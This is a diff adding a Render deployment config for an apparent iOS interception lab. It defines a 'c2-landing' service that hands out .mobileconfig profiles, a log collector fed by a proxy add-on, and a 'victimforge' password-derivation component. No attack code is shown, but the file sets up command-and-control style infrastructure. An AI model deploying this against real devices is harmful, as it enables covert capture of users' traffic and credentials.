@@ -1,0 +1,60 @@
+services:
+  # NOTE: Render's edge only accepts HTTP(S) on 80/443 (TLS-terminated).
+  # An iOS *manual global proxy* payload speaks raw HTTP-proxy protocol, which
+  # does not survive that edge — run the fallback proxy on the VPS instead
+  # unless you have verified CONNECT tunneling through Render works for you.
+  # To experiment anyway, uncomment this block:
+  #
+  # - type: web
+  #   name: proxy-fallback
+  #   runtime: docker
+  #   dockerfilePath: ./render/Dockerfile
+  #   plan: starter        # free tier sleeps — don't use for this
+  #   envVars:
+  #     - key: ROLE
+  #       value: proxy
+  #     - key: PROXY_USER
+  #       sync: false
+  #     - key: PROXY_PASS
+  #       sync: false
+  #     - key: COLLECTOR_URL
+  #       sync: false
+  #     # same token as log-collector - proxy_addon sends it on /ingest
+  #     - key: COLLECT_TOKEN
+  #       sync: false
+
+  - type: web
+    name: log-collector
+    runtime: docker
+    dockerfilePath: ./render/Dockerfile
+    plan: starter
+    envVars:
+      - key: ROLE
+        value: collector
+      - key: COLLECT_TOKEN
+        sync: false
+
+  # Lab landing page: serves the notice page and /api/profile (.mobileconfig)
+  - type: web
+    name: c2-landing
+    runtime: python
+    plan: starter
+    buildCommand: pip install -r landing/requirements.txt
+    startCommand: python landing/server.py
+    healthCheckPath: /
+    envVars:
+      # real lab values — set these in the Render dashboard, never hardcode
+      - key: LAB_VPS_IP
+        sync: false
+      - key: LAB_DOH_HOST
+        sync: false
+      - key: LAB_PROXY_HOST
+        sync: false
+      - key: LAB_MDM_HOST
+        sync: false
+      - key: LAB_APNS_TOPIC
+        sync: false
+      # victimforge refuses to derive device passwords without this
+      - key: VPN_SECRET_SALT
+        sync: false
+      # Render injects PORT automatically; server.py reads it
